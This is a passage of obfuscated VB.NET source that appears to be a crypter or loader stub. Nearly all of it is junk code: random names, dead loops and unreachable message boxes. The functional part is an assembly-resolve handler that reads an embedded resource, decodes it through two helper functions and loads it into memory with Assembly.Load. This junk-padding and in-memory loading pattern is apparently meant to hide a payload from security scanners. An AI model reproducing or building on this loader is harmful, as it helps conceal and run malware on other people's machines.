        For DUuaLgMh = 0 To 100
            nmFjrwXN += 1
        Next
        Return "gXtiKCan"
    End Function
    Public Shared Function VSweVqWn()
        Dim PEkdnxZN As Integer = 214
        Dim sHiklTnT As String = "WKgskpAZ"
        Dim AOeziLNf As Integer = 333
        Dim eRcHghbl As Long = 431
        Dim uzSyASRF As Object = {}
        Dim lYZVcaCw As Integer = 17
        Dim PbXdawPC As Integer = 0
        For teVkZSdI = 0 To 100
            PbXdawPC += 1
        Next
        Dim XiTsXoqO As Object = {}
        Dim AlRzVLDU As Boolean = False
        If AlRzVLDU = True Then
            MsgBox("eoPHThRa")
        End If
        Dim uWFynRHu As Byte() = {}
        Return "YaDFmnUA"
    End Function
    Public Shared Sub zEpdnIp()
        Dim YPFYvJD As Object = {}
        Dim GjzcCBq As Object = {}

        Dim jsFLqyg As String = "UTGpNmS"
        Dim SieDoOQ As Long = 938
        Dim XVNAkjg As Object = {}
    End Sub
    Public Shared Function vmAGYFBx()
        Dim WismGeQq As Integer = 0
        For jgODwRym = 0 To 100
            WismGeQq += 1
        Next
        Dim wekTnEgj As String = "KcGjerNf"
        Dim lvlQyPSN As Integer = 959
        Dim ytHgpCAK As Boolean = False
        If ytHgpCAK = True Then
            MsgBox("MrdxgphG")
        End If
        Dim nKHdANmo As Long = 273
        Dim AIdurAUl As Byte() = {}
        Dim NHzKinBh As Long = 573
        Dim bFVaYZje As Object = {}
        Dim oDrrPMQa As String = "BBNHGzyX"
        Dim PzjXwlgT As Integer = 712
        Return "cxFonYNQ"
    End Function
    Public Shared Sub rlSnFBM()
        Dim zgHKSTa As Long = 820


        Dim pojJxDy As Object = {}

    End Sub
    Public Shared Function lxCBMVwu()
        Dim tEzQIOXG As Integer = 0
        For WHxXGkkM = 0 To 100
            tEzQIOXG += 1
        Next
        Dim ALvfEGxS As String = "eOtmDcLY"
        Dim uwidXMBs As Long = 55
        Dim YzhlVjOy As Long = 385
        Dim CDfsTFcE As Boolean = False
        If CDfsTFcE = True Then
            MsgBox("fGdARbpK")
        End If
        Dim JJbHQxCQ As Object = {}
        Dim uVPENOIR As Integer = 543
        Dim YYNMLkVX As String = "oGCDfULs"
        Dim SJAKdqZx As Integer = 0
        For wNySbMmD = 0 To 100
            SJAKdqZx += 1
        Next
        Dim ZQwZajzJ As Boolean = False
        If ZQwZajzJ = True Then
            MsgBox("DTvhYFNP")
        End If
        Return "hXtoWbaV"
    End Function
    Public Shared Sub VEPdBHp()
        Dim lbyclRS As Integer = 414
        Dim eywpSyK As Integer = 446
        Dim xblPTFl As Integer = 404

        Dim witqJfO As Long = 812
        Dim jYQijST As Object = {}
    End Sub

    Private Shared Function qxEaXwmvUvf(sender As Object, htZhSFxyaaQ As System.ResolveEventArgs) As System.Reflection.Assembly

        'get the root namespace (im tired of manually adding this)
        Dim vqZJDzQyLJx As Boolean = False
        If vqZJDzQyLJx = True Then
            Debug.Print("BVsTOTJDPGd")
        End If
        Dim fXhPQOecmql As String = "qCqNHeAfbNb"
        Dim rBhCLDHyYYf As Object = {}
        Dim WkIfoxmKSVG As Object = {}
        Dim JleECkLgKFg As Byte() = {}
        Dim RbhnfVLbBIE As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
        Dim UApIsccEkS As Long = 118
        Dim pKGDZHVMOM As Integer = 0
        For BVsWvuIVXG = 0 To 100
            pKGDZHVMOM += 1
        Next
        Dim XXtfrYfPWB As Integer = 0
        For MRftjjriKp = 0 To 100
            XXtfrYfPWB += 1
        Next
        Dim ygZfYxPyIj As Byte() = {}
        Dim dEhaaKoxnqy As String = Strings.Left(RbhnfVLbBIE.EntryPoint.DeclaringType.Namespace, RbhnfVLbBIE.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        Dim PuHYgYDCJG As Boolean = False
        If PuHYgYDCJG = True Then
            Debug.Print("tCEwYuAHIA")
        End If
        Dim vXaaUsEibt As Integer = 711
        Dim aXHLbNgZvo As Boolean = False
        If aXHLbNgZvo = True Then
            Debug.Print("ekNClJOlki")
        End If
        Dim YymRlPszDb As Boolean = True
        If YymRlPszDb = False Then
            Debug.Print("rXkmowcjrT")
        End If
        Dim mdtOCBjjfN As String = "GvbwVhyFoG"
        'fuck ya! Im done manually adding that shit!!!

        Dim LceAEyXM = hZgtGcKG()
        Dim JJmsvdQRETF As String = dEhaaKoxnqy + New Reflection.AssemblyName(htZhSFxyaaQ.Name).Name + ".dll"

        BkWgrAb()
        'resourceName = "dll.dll"
        Dim FCxPZtuWWOG As Boolean = True
        If FCxPZtuWWOG = False Then
            Debug.Print("fEwYvtmvJYE")
        End If
        Dim UnDdkeWFYUy As String = "NClDfLsBuDW"
        Dim GjiwzsEJuZa As Long = 582
        Dim IaJyTQpOLmo As Integer = 0
        For WMYXacKeQhd = 0 To 100
            IaJyTQpOLmo += 1
        Next
        Dim YamZgzlYHQU As Object = {}
        Using EiKniiOeVCX = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(JJmsvdQRETF)

            Dim oGWeUxMh = aIANdKel()

            Dim vHjJeIiXSP As Boolean = True
            If vHjJeIiXSP = False Then
                Debug.Print("nGmKcPsLrl")
            End If
            Dim UWqJlindGE As Long = 487
            Dim JsqWquKGUW As Boolean = True
            If JsqWquKGUW = False Then
                Debug.Print("mgrgGQTPXl")
            End If
            Dim vkWZMHIMRG As Long = 303
            Dim DqbaTjjsABM = New Byte(EiKniiOeVCX.Length - 1) {}

            Dim jkcROxFC = VuWnILtU()
            'decode assembly here
            Dim IXuILPZIIz As Boolean = True
            If IXuILPZIIz = False Then
                Debug.Print("ovOtFkqoBR")
            End If
            Dim OEVdSKLvPl As Object = {}
            Dim cedKqwTfTC As Boolean = True
            If cedKqwTfTC = False Then
                Debug.Print("kqZpgoeqsW")
            End If
            Dim SyMBEGEubq As String = "IMvcYQEKKK"


            vvtAixD()
            EiKniiOeVCX.Read(DqbaTjjsABM, 0, DqbaTjjsABM.Length)
            Dim opeNCellVUi As Integer = 97
            Dim IAEUejWaCDL As Boolean = True
            If IAEUejWaCDL = False Then
                Debug.Print("sjVlnZdkhZv")
            End If
            Dim PCCShcNmdhX As Object = {}
            Dim neggOeRnYfq As Boolean = False
            If neggOeRnYfq = True Then
                Debug.Print("QomPCbHZZOm")
            End If
            Dim tRHROYnYElP As Integer = 957
            DqbaTjjsABM = beMgkMAYvdT(XJCjoRPyCTr(DqbaTjjsABM))
            Dim AhRtHjOMnx As Boolean = True
            If AhRtHjOMnx = False Then
                Debug.Print("hxVsQCKeCR")
            End If
            Dim IzMprbJWlm As Long = 263
            Dim YREjeMvtKF As Integer = 0
            For uqssMpIbiW = 0 To 100
                YREjeMvtKF += 1
            Next
            Dim eqPRzFMRms As Boolean = False
            If eqPRzFMRms = True Then
                Debug.Print("jSrVMAOEVJ")
            End If
            Return Reflection.Assembly.Load(DqbaTjjsABM)

            XsYIlgr()


            Dim hVgnpWYw = VPukNiUm()
        End Using ' stream

        cudtnfi()
    End Function

    Public Shared Function hZgtGcKG()
        Dim ogcICUlS As Byte() = {}
        Dim SjaPAryY As String = "wmYXyNLe"
        Dim apWexjZj As Boolean = False
        If apWexjZj = True Then
            MsgBox("qYMVRTPE")
        End If
        Dim TbKdPpcK As Integer = 0
        For xeIkNMqP = 0 To 100
            TbKdPpcK += 1
        Next
        Dim biGrLiDV As Boolean = True
        If biGrLiDV = False Then
            MsgBox("TGNPnqoN")
        End If
        Dim wJLXmMBT As Long = 246
        Dim aNJekiPZ As String = "qvzVESFt"
        Dim UyxdCpSz As Integer = 403
        Dim yBvkALgF As Boolean = False
        If yBvkALgF = True Then
            MsgBox("bFtrzhtL")
        End If
        Dim FIrzxDGQ As Integer = 991
        Return "jLpGvZUW"
    End Function
    Public Shared Sub BkWgrAb()
        Dim pSdlfmL As String = "IlTftsS"
        Dim SQcckIo As Long = 190
        Dim MIXCspU As Object = {}



    End Sub
    Public Shared Function aIANdKel()
        Dim BEsuKktd As Byte() = {}
        Dim OCOKBXba As Boolean = True
        If OCOKBXba = False Then
            MsgBox("qVtrWvgI")
        End If
        Dim DTPHMiNF As Integer = 801
        Dim QRlYDVvB As String = "eQHouHcx"
        Dim rOdEkuKu As Byte() = {}
        Dim ShHlFTPc As String = "ffdBwFwZ"
        Dim tdzSmseV As Byte() = {}
        Dim GbVidfMS As Integer = 70
        Dim TZryURtO As Integer = 294
        Dim hXNPKEb As Boolean = False
        If hXNPKEb = True Then
            MsgBox("GPOquEz")
        End If
        Return "iKxMfDV"
    End Function
    Public Shared Function VuWnILtU()
        Dim MvqLxUoW As Byte() = {}
        Dim bmwoDGAF As String = "DxKimdjZ"
        Dim SnQMrPvH As Byte() = {}
        Dim uyeGbmeb As String = "XJtAKJNv"
        Dim lzyeQvZe As Integer = 362
        Dim OLNYzSIy As Boolean = False
        If OLNYzSIy = True Then
            MsgBox("cBSCFEUg")
        End If
        Dim FMhwobDA As Integer = 0
        For TCmatNPi = 0 To 100
            FMhwobDA += 1
        Next
        Dim wNBUdkyC As Object = {}
        Dim LDGxiVKl As Integer = 348
        Return "BkeIwfQq"
    End Function
    Public Shared Sub vvtAixD()
        Dim LHdTfHM As Integer = 784
        Dim AhTljra As Integer = 559
        Dim oipKwez As Integer = 378


    End Sub
    Public Shared Sub XsYIlgr()

        Dim hpvZAwD As Integer = 109

        Dim vcKxIIY As Long = 893
        Dim XthTgGk As Object = {}
        Dim aStCbdf As String = "JTYmJVc"
    End Sub
    Public Shared Function VPukNiUm()
        Dim fGKZnYEV As String = "rMwcOMHg"
        Dim DSifqAKq As Long = 113
        Dim PYViSnOB As Integer = 0
        For NJyVQpta = 0 To 100
            PYViSnOB += 1
        Next
        Dim ZPkYsdxk As Integer = 0
        For zqfryDYh = 0 To 100
            ZPkYsdxk += 1
        Next
        Dim LwSuarbr As Long = 220
        Dim JgvhYtHQ As Byte() = {}
        Dim VmhkAhKb As Byte() = {}
        Dim hsTncVOlxW As Long = 931
        Dim hyTDWVylWq As Boolean = False
        If hyTDWVylWq = True Then
            MsgBox("pJOiMNJvvK")
        End If
        Return "YRBujfjzef"
    End Function
    Public Shared Sub cudtnfi()
        Dim yxmNekx As Long = 560
        Dim ZiXBcjz As Object = {}
        Dim wADjWlj As String = "wRKrzLg"
        Dim YjgNYJs As Object = {}
        Dim bHsvSgo As Object = {}

    End Sub

End Class
Public Class Tuple(Of T1, T2)
    Public Property Item1() As T1
        Get
            Return m_Item1
        End Get
        Set
            m_Item1 = Value
        End Set
    End Property
    Private m_Item1 As T1
    Public Property Item2() As T2
        Get
            Return m_Item2
        End Get
        Set
            m_Item2 = Value
        End Set
    End Property
    Private m_Item2 As T2
    Public Sub New(Item1 As T1, Item2 As T2)
        Me.Item1 = Item1
        Me.Item2 = Item2
    End Sub
End Class